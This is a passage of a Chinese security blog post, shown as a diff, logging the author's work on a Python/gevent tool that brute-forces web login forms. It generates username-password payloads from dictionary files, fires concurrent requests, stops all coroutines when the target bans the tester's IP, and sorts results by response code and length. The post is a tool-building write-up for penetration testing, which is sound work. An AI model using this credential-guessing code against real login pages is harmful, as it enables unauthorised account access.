+    for username in open(&quot;dictionary/username.txt&quot;,&quot;r&quot;,encoding=&#39;UTF-8-sig&#39;):
+        for password in open(&quot;dictionary/password.txt&quot;, &quot;r&quot;,encoding=&#39;UTF-8-sig&#39;):
+            tmp=usernameandpassowrd
+            tmp2=tmp.replace(&quot;qwrdxername&quot;,username.strip())
+            tmp3=tmp2.replace(&quot;qwrdxerpassword&quot;,password.strip())
+            payloadlist.append(tmp3)
+    print(&quot;payload个数为:%d&quot;%len(payloadlist))
+    return payloadlist
+</code></pre>
+<p><img src="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image-20220113105029956.png" alt="image-20220113105029956"></p>
+<p>性能居然提升了。</p>
+<h3 id="2-被ban-IP的问题"><a href="#2-被ban-IP的问题" class="headerlink" title="2.被ban IP的问题"></a>2.被ban IP的问题</h3><p>实际应用中。测试了一个目标，扫描太快被封禁了，但那几千个协程还是要执行啊， 每一个等待5秒肯定不行的</p>
+<p>需求: 如果目标返回无法建立连接，将gevent创建的所有协程kill掉</p>
+<pre><code class="python">requests.exceptions.ConnectionError: HTTPConnectionPool(host=&#39;&#39;, port=80): Max retries exceeded with url: 
+</code></pre>
+<p> 用到gevent.killall 来关闭</p>
+<p>对发包代码修改如下</p>
+<pre><code class="python">def send_request(url,payload,headers,method,result,sem):
+    try:
+        resp = requests.request(**&#123;
+            &#39;url&#39;: url,
+            &#39;data&#39;: payload,
+            &#39;verify&#39;: False,
+            &#39;method&#39;: method,
+            &#39;headers&#39;: headers,
+            &#39;allow_redirects&#39;: True,
+            # &#39;proxies&#39;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;
+        &#125;)
+        # 好像不加锁也不会报错，疑惑
+        sem.acquire()
+        result.append([payload, resp.status_code, len(resp.text)])
+        sem.release()
+    except requests.exceptions.ConnectionError:
+        print(&quot;已被目标IP封&quot;)
+</code></pre>
+<p>经测试，以上方法行不通，问题可能出现在for循环，</p>
+<p>另一种思路: 引入一个控制信号量 controller </p>
+<ol>
+<li>协程发包前检查这个变量，若值为1，不发包退出。</li>
+<li>若值为0，进行发包操作。</li>
+<li>如果发包过程中产生了异常，设置这个信号量为1 。</li>
+</ol>
+<p>在python中没有指针，用列表记录信号量</p>
+<pre><code class="python">def send_request(url,payload,headers,method,result,sem,controller):
+    try:
+        if controller[0]==1:# 若值为1，不发包退出。
+            print(&quot;目标已down&quot;)
+            return
+        
+        resp = requests.request(**&#123;
+            &#39;url&#39;: url,
+            &#39;data&#39;: payload,
+            &#39;verify&#39;: False,
+            &#39;method&#39;: method,
+            &#39;headers&#39;: headers,
+            &#39;allow_redirects&#39;: True,
+            # &#39;proxies&#39;:&#123;&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;&#125;
+        &#125;)
+        # 好像不加锁也不会报错，疑惑
+        sem.acquire()
+        result.append([payload, resp.status_code, len(resp.text)])
+        sem.release()
+    except requests.exceptions.ConnectionError:
+        print(&quot;已被目标IP封&quot;)
+        controller[0]=1#如果发包过程中产生了异常，设置这个信号量为1 。
+</code></pre>
+<p>基本完成了功能需求</p>
+<h3 id="3-输出结果优化"><a href="#3-输出结果优化" class="headerlink" title="3. 输出结果优化"></a>3. 输出结果优化</h3><p>输出为CSV，在burpsutie爆破中，一般是对返回值和返回长度进行排序，但csv并没有排序功能，因此需要在开发一个小脚本对输出结果进行处理，生成按返回值排序和按长度排序的结果，方便对比查看。</p>
+<h3 id="4-钉钉提醒"><a href="#4-钉钉提醒" class="headerlink" title="4. 钉钉提醒"></a>4. 钉钉提醒</h3><blockquote>
+<p>参考</p>
+<p>web页面</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yzddmr6/WebCrack">https://github.com/yzddmr6/WebCrack</a></p>
+<p>python与Burp Suite联动暴力破解 </p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260406.html">https://www.freebuf.com/articles/web/260406.html</a><br>python解析http包并发送:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/haoren_xhf/article/details/104937390">https://blog.csdn.net/haoren_xhf/article/details/104937390</a></p>
+<p>[[图灵程序设计丛书].Python语言及其应用  第十一章</p>
+<p>Gevent介绍</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/73ccb425a710">https://www.jianshu.com/p/73ccb425a710</a></p>
+<p>gevent官方文档</p>
+<p><a target="_blank" rel="noopener" href="http://www.gevent.org/contents.html">http://www.gevent.org/contents.html</a></p>
+<p>Python gevent高并发（限制最大并发数、协程池）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012206617/article/details/108059173">https://blog.csdn.net/u012206617/article/details/108059173</a></p>
+<p>kill掉全部的greenlet</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnpython.com/qa/135874">https://www.cnpython.com/qa/135874</a></p>
+</blockquote>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1944270374@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2020-2023 qwrdxer
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 722px;
+    }
+    .nav.fullscreen {
+        margin-left: -722px;
+    }
+    .nav-left {
+        width: 300px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 542px;
+        }
+        .nav.fullscreen {
+            margin-left: -542px;
+        }
+        .nav-left {
+            width: 150px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 542px;
+            margin-left: -542px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    #post {
+        background: url(/img/start.png);
+    }
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
